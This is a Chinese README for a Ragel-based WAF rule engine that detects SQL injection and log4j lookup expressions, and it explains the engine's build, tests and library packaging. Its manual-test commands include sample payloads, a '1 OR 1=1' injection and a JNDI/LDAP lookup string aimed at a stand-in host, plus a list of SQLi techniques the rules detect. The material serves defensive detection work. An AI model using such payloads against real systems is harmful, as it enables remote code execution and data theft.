# Ragel 规则引擎（SQLi / Log4j 语义检测）

一个用 **Ragel 状态机**实现的编译型攻击检测规则引擎。规则以 `.rl` 编写并**编译成 C 状态机**，
对 token 流做逐位置匹配，做语义级检测（sqli 24 条规则 / log4j 查找表达式 4 类）。

项目以 Ragel 为主：规则唯一真源在 `rules/ragel/`，构建期生成 C 状态机，再打包成**规则库**（静态
`.a`，可选 `.so`）与**契约头**对外交付；`sql_scan` / `sqli_scan` / `log4j_scan` 是链接规则库的
驱动（也是调用方示例）。

> 仓库早期还实现过一套 ANTLR4 后端（`.g4` → `rulec` → `.so` 插件 → `engine`），已归档到
> `misc/archive_antlr4/`（详见文末），不再参与构建。

## 目录结构

```
├── CMakeLists.txt          # 顶层构建：.rl -> gen .c -> 规则库 + 驱动
├── Makefile                # 不依赖 cmake 的等价构建（产物一致）
├── README.md
├── rules/ragel/            # 规则唯一真源（纯规则，.rl 可直接生成 C / 被打包成库）
│   ├── sql_tokens.rl / .h  # SQL 词法（生成 lex_sql / sql_tokens 契约）
│   ├── rule_sql.rl / .h    # SQL 表达式/语句骨架 + 语义谓词（rule_sql 契约）
│   ├── sqli_rules.rl / .h  # 24 条 SQLi 规则（sqli_rules 契约：24 个 sql_match_sqli_* 入口）
│   ├── sqli_scan.c         # 规则库自带的最小驱动/示例（逐位置匹配 + 谓词复核）
│   └── log4j_lookup.rl / .h# log4j ${...} 识别状态机（导出 log4j_scan()）
├── sql_scan.c              # 驱动：SQLTokens + RuleSQL 骨架扫描
├── log4j_scan.c            # 驱动：log4j 查找分类（消费 log4j_lookup.h）
├── test.sh / test_sqli.sh / test_log4j.sh   # 规则校验断言
├── misc/
│   ├── DESIGN.md           # 历史架构设计（含 antlr4 版设计）
│   ├── README              # 原始需求（编译型 WAF 规则平台）
│   └── archive_antlr4/     # ANTLR4 后端 + g4 规则 + 配套脚本/jar（归档）
├── tools/                  # 早期 fcall/fret 实验（保留作参考，不参与构建）
└── build/                  # 构建产物（不入库）
    ├── ragel/gen/          # .rl 生成的中间 C（sql_tokens.c / rule_sql.c / sqli_rules.c / log4j_lookup.c）
    └── ragel/              # libragel_sql.a / libragel_log4j.a + sql_scan / sqli_scan / log4j_scan
```

## 规则怎么"给别人调用"——库 + 头文件（本仓库做法）

**结论：规则目录（`.rl`）只面向"写规则的人"；面向"调用方"的交付是 契约头 + 编译好的库**，
而不是把一堆 `.rl` 或散落的生成 `.c` 扔给对方。

```
.rl 唯一真源
   |  (ragel，构建期)
   v
build/ragel/gen/*.c         中间产物（不入库）
   |  (cc)
   v
libragel_sql.a              词法 + 骨架 + 24 条 SQLi 规则
libragel_log4j.a            log4j 查找识别
   |  契约头: rules/ragel/*.h (sql_tokens.h / rule_sql.h / sqli_rules.h / log4j_lookup.h)
   v
调用方: #include <ragel_rules/sqli_rules.h>  +  链接 -lragel_sql
```

- 调用方**不需要安装 ragel**，也不需要拷贝/重编译任何生成 C。
- 规则更新 = 换 `.a`/`.so` 与头文件（同一条规则只在一个 `.rl` 里维护）。
- `sqli_scan` 等驱动就是"外部调用方"的样板：它们 include 契约头并链接规则库，
  用于 dogfooding —— 库可用才发布。

### 什么场景才"直接分发生成的 .c"？

只有当调用方要求**单文件零依赖嵌入**（无构建系统、想把规则逻辑整个编译进自己工程，类似
sqlite amalgamation）时才这么做。此时建议用 `ragel -C -o out.c xxx.rl` 一次性导出，并把
契约头一起交付；代价是每次改规则都要重新分发文件、且内部符号可能污染调用方命名空间。
本仓库默认走**库 + 头**路线，不做单文件合包。

## 构建与测试

前置：`ragel`、`gcc`（/`clang`）、`cmake`、`make`。

```bash
# CMake 路径（推荐）：生成 .rl -> 规则库 -> 驱动
cmake -S . -B build
cmake --build build -j

# 等价 Makefile 路径（产物一致，输出到 build/ragel）
make -j

# 三套规则校验（骨架 40 / sqli 93 / log4j 25 断言）
cmake --build build --target validate_ragel
# 或
make test && make test-sqli && make test-log4j
```

安装库与头（对外发布）：

```bash
cmake --install build --prefix /usr/local   # libragel_sql.a / libragel_log4j.a
                                            # include/ragel_rules/*.h
```

手工检测：

```bash
./build/ragel/sqli_scan "SELECT * FROM users WHERE 1=1" "1 OR 1=1" "id=1"
./build/ragel/log4j_scan '${jndi:ldap://evil/x}' '${env:HOME}'
```

## 规则分层与语义谓词

- `sql_tokens.rl`：词法层。对输入文本切 token（注释/空白/悬空引号容错），输出 `Token[]`，
  并映射关键字编号（大小写不敏感）。
- `rule_sql.rl`：骨架层。在 token 类型数组上做 CFG 匹配：
  `sql_match_expr` / `sql_match_select` / `sql_match_const`（递归子查询/括号用 fcall/fret），
  以及语义谓词 `sql_is_ident` / `sql_const_numbers_equal` / `sql_const_strings_equal` 等。
- `sqli_rules.rl`：24 条 SQLi 规则（`always_true` / `string_tautology` / `boolean_injection` /
  `union_select` / `stacked_query` / `sleep` / `load_file` / `benchmark` / `pg_sleep` / 子查询 /
  LIKE / BETWEEN / 语句片段 / `db_enumeration` …）。结构由状态机保证，恒真等需语义复核的
  谓词由驱动用 `rule_sql.h` 复核（`sqli_scan.c` 即样板）。
- `log4j_lookup.rl`：log4j `${...}` 查找表达式识别，归约分类 JNDI / SENSITIVE / CHAIN / EXPR。

新增一条 SQLi 规则：在 `sqli_rules.rl` 加一个机器入口，同步在 `sqli_rules.h` 声明入口，
`sqli_scan.c` 规则表登记 —— 其余层无需改动。

## 验证结果

- `test.sh`（骨架语义）40 断言全过。
- `test_sqli.sh`（24 条规则正/负/对抗样本）93 断言全过。
- `test_log4j.sh`（分类 + 大小写/嵌套变体）25 断言全过。
- 性能：DFA 编译期确定、逐位置短路，进程内单请求 µs 级
  （早期 ANTLR 版压测脚本见 `misc/archive_antlr4/misc/`）。

## 归档说明：ANTLR4 后端

早期双后端探索中 ANTLR4 版（`tools/antlr4/`、`rules/antlr4/`、`misc/*.sh`、antlr jar 等）
已整体归档到 `misc/archive_antlr4/`，不参与构建，仅作历史参考；`misc/DESIGN.md` 记录了两版
的整体设计，`misc/README` 是原始需求。当前实现与后续演进一律以 Ragel 为主。
